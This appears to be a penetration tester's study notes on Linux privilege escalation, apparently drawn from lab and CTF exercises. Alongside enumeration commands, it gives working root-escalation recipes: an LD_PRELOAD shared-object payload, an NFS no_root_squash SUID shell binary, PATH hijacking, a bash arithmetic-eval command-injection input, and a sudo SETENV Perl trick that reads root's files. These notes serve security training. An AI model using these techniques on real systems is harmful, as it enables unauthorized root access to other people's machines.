---
title: Linux Privilege Esclation
source_url: https://notes.incendium.rocks/pentesting-notes/linux-pentesting/linux-privilege-esclation
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: linux
---

***

## Enumeration

Commands:

```bash
hostname
```

Will return the hostname of the target machine.

```bash
uname -a
```

Will print system information giving us additional detail about the kernel used by the system.

```bash
cat /proc/version
```

The proc filesystem (procfs) provides information about the target system processes.

```bash
cat /etc/issue
```

This file usually contains some information about the OS but can easily be customized.

```bash
ps
```

This command is an effective way to see the running processes on a Linux system.

```bash
env
```

This command will show environment variables.

```bash
sudo -l
```

Check which commands can be ran as root

```bash
history
```

Looking at earlier commands with this command.

```bash
ifconfig
```

The target system may be a pivoting point to another network.

```bash
netstat
```

Following an initial checks for existing interfaces and network routes, it is worth looking into existing communications.

* `netstat -a`: shows all listening ports and established connections.
* `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
* `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)

## Find command

```bash
find
```

Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.

**Find files:**

* `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
* `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
* `find / -type d -name config`: find the directory named config under “/”
* `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
* `find / -perm a=x`: find executable files
* `find /home -user frank`: find all files for user “frank” under “/home”
* `find / -mtime 10`: find files that were modified in the last 10 days
* `find / -atime 10`: find files that were accessed in the last 10 day
* `find / -cmin -60`: find files changed within the last hour (60 minutes)
* `find / -amin -60`: find files accesses within the last hour (60 minutes)
* `find / -size 50M`: find files with a 50 MB size

***

## Automated Enumeration Tools

* **LinPeas**: <https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS>
* **LinEnum:** <https://github.com/rebootuser/LinEnum>
* **LES (Linux Exploit Suggester):** <https://github.com/mzet-/linux-exploit-suggester>
* **Linux Smart Enumeration:** <https://github.com/diego-treitos/linux-smart-enumeration>
* **Linux Priv Checker:** <https://github.com/linted/linuxprivchecker>

***

## Kernel Exploits

<https://www.linuxkernelcves.com/cves>

The Kernel exploit methodology is simple;

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

***

## Sudo command

The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the `sudo -l` command.

```bash
sudo -l
```

<https://gtfobins.github.io/> is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

### **Leverage LD\_PRELOAD**

On some systems, you may see the LD\_PRELOAD environment option.

LD\_PRELOAD is a function that allows any program to use shared libraries.

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD\_PRELOAD (with the env\_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD\_PRELOAD option pointing to our .so file

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

***

## SUID

You will notice these files have an “s” bit set showing their special permission level.

`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

A good practice would be to compare executables on this list with GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io/))

***

## Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level.

```bash
getcap -r / 2>/dev/null
```

We can use the getcap tool to list enabled capabilities

💡 GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

Example: <https://gtfobins.github.io/gtfobins/vim/#capabilities>

***

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.

Any user can read the file keeping system-wide cron jobs under `/etc/crontab`

```bash
cat /etc/crontab
```

***

## PATH

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH.

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?

Find writeable folders:

```bash
find / -writable 2>/dev/null
```

An alternative could be the command below.

`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`

We have added “grep-v proc” to get rid of the many results related to running processes.

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “`export PATH=/tmp:$PATH`” command accomplishes this.

```bash
export PATH=/tmp:$PATH
```

of

```bash
export PATH=$(pwd):$PATH
```

***

## NFS

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

The critical element for this privilege escalation vector is the “no\_root\_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no\_root\_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

NFS (Network File Sharing) configuration is kept in the /etc/exports file

```bash
cat /etc/exports
```

We will start by enumerating mountable shares from our attacking machine.

```bash
showmount -e {IP}
```

We will mount one of the “no\_root\_squash” shares to our attacking machine and start building our executable.

```bash
mount -o rw {IP}:/share /tmp/mountdirectory
```

As we can set **SUID** bits, a simple executable that will run /bin/bash on the target system will do the job.

```c
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
	return 0;
}
```

Compile it:

```c
gcc nfs.c -o nfs -w
```

Give it SUID permissions to run as **root**

```c
chmod +s nfs
```

***

## Pspy

pspy is a command line tool designed to snoop on processes without need for root permissions.

```
.\pspy64
```

## Bash scripts

A bash script that is being ran by someone with higher privileges can be interesting to investigate.

Example of vulnerable bashscript:

**Bash’s white collar eval: \[\[ $var -eq 42 ]] runs arbitrary code too**

```sql
#!/bin/bash
read -rp "Enter guess: " num
if [[ $num -eq 42 ]]
then
  echo "Correct"
else
  echo "Wrong"
fi
```

Exploit:

```sql
$ ./myscript
Enter guess: **a[$(/path/to/exploit.sh>&2)]+42**
Sun Feb  4 19:06:19 PST 2018
Correct
```

## ENV

We can also manipulate our environment to escalate privileges. Consider the following sudoers file:

```
(root) SETENV: NOPASSWD: /opt/monitor.sh
```

We have the ability to SETENV as root. This means that we can set any environment variable.

### Exploiting env

We can for example exploit it with PERL:

```
jack@clicker:/tmp$ sudo PERL5OPT=-d PERL5DB='system("cat /root/root.txt");' /opt/monitor.sh
```
